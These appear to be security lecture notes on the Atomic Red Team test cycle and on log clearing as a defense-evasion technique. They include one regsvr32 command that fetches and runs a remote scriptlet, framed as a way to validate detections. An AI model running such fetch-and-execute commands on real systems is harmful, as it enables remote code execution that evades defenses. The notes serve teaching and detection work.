# Lecture Notes: Log Clearing

## Atomic Testing Cycle

**Why**
- Why should we perform the Atomic Testing Cycle?

**What**
- What is the Atomic Testing Cycle?
  - Getting Started Testing with Atomic Tests
    - We suggest a phased approach to running a test and evaluating your results:
      1. Select a test
      1. Execute Test
      1. Collect Evidence
      1. Develop Detection
      1. Measure Progress
    - Best Practices
      - Be sure to get permission and necessary approval before conducting tests. Unauthorized testing is a bad decision.
      - Set up a test machine that would be similar to the build in your environment. Be sure you have your collection/EDR solution in place, and that the endpoint is checking in and active.
      - Spend some time developing a test plan or scenario. This can take many forms. An example test plan could be to execute all the Discovery phase items at once in a batch file, or run each phase one by one, validating coverage as you go.
    - **Select a test**
      - Select one or more Atomic Tests that you plan to execute.
    - **Execute Test**
      - In this example we will use Technique T1218.010 "Regsvr32" and Atomic Test "Regsvr32 remote COM scriptlet execution" (an RCE attack). This particular test is fairly easy to exercise since the tool is on all Windows workstations by default.
      - The details of this test, which are located [here](https://github.com/redcanaryco/atomic-red-team/blob/master/atomics/T1218.010/T1218.010.md), describe how you can test your detection by simply running the below command:

        ```
        regsvr32.exe /s /u /i:https://raw.githubusercontent.com/redcanaryco/atomic-red-team/master/atomics/T1218.010/src/RegSvr32.sct scrobj.dll
        ```

    - **Collect Evidence**
      - What does your security solution observe?
        - You may see a file modification in the user’s profile.
        - You may detect network connections made by regsvr32.exe to an external IP.
        - There may be an entry in the proxy logs.
        - You may observe the scrobj.dll loading on Windows.
        - Or you might not observe any behavior on the endpoint or network.
      - This is why we test! We want to identify visibility gaps and determine where we need to make improvements.
    - **Develop Detection**
      - So you executed the test and none of your defenses fired – that’s why we test! Based on your observations and detection capabilities, it is time to use what you have to try to detect this event in your environment.
      - Once the detection is built, it is time to validate that the detection is working and that it is appropriately tuned. If you were to write your detection too broadly and “detect” every regsvr32.exe without any suppression, you are going to be digging out from a mountain of false positives. But if you write it too narrow and it only detects regsvr32.exe with the exact command line `/s /u /i` then all an attacker has to do is slightly modify their command line to evade your detection.
      - Try detecting `regsvr32.exe /i` for suspicious activity.
    - **Measure Progress**
      - One of the goals is to try to measure your coverage/capabilities against the ATT&CK Matrix and to identify where you may have gaps.

**How**
- The Atomic Red Team project accepts public contributors (open-source style) at https://atomicredteam.io/contributing
- Atomic Philosophy
  - "Atomic Red Team welcomes all types of contributions as long as it is mapped to MITRE ATT&CK. A few guidelines:
  - Tests are made to be “easy”. If your Atomic Test is complicated and requires multiple external utilities/packages/Kali, we may ask that you simplify it.
  - TEST YOUR ATOMIC TEST! Be sure to run it from a few OSes/platforms before submitting a pull request to ensure everything is working correctly.
  - If sourcing from another tool/product (ex. generated command), be sure to cite it in the test’s description." -Atomic Red Team > Contributing

## Log Clearing

**Why**
- Why would an adversary want to delete logs?
  - Covering tracks
  - Damage integrity of log files
  - Part of the "defense evasion" tactic

**What**
- What is log clearing?
  - "Adversaries may delete or alter generated artifacts on a host system, including logs or captured files such as quarantined malware. Locations and format of logs are platform or product-specific, however standard operating system logs are captured as Windows events or Linux/macOS files such as Bash History and /var/log/*.
  - These actions may interfere with event collection, reporting, or other notifications used to detect intrusion activity. This that may compromise the integrity of security solutions by causing notable events to go unreported. This activity may also impede forensic analysis and incident response, due to lack of sufficient data to determine what occurred." -[MITRE ATT&CK T1070](https://attack.mitre.org/techniques/T1070/)
  - Example of log clearing:
    - S0089, a malware toolkit called BlackEnergy, uses a tool called KillDisk to delete Windows Event Logs ([Ref. WeLiveSecurity](https://www.welivesecurity.com/2016/01/03/blackenergy-sshbeardoor-details-2015-attacks-ukrainian-news-media-electric-industry/))
  - ATT&CK details
    - ID: T1070.001
    - Sub-technique of: T1070
    - Tactic: Defense Evasion
    - Platforms: Windows
    - System Requirements: Clearing the Windows event logs requires Administrator permissions
    - Permissions Required: Administrator
    - Data Sources: Command: Command Execution, Process: OS API Execution
    - Defense Bypassed: Anti Virus, Host Intrusion Prevention Systems, Log Analysis
    - Version: 1.0
    - Created: 28 January 2020
    - Last Modified: 29 March 2020
  - Log rotation can be used operationally to keep file sizes down

**How**
- How can an adversary clear logs?
- How can we reproduce this in our lab environment?
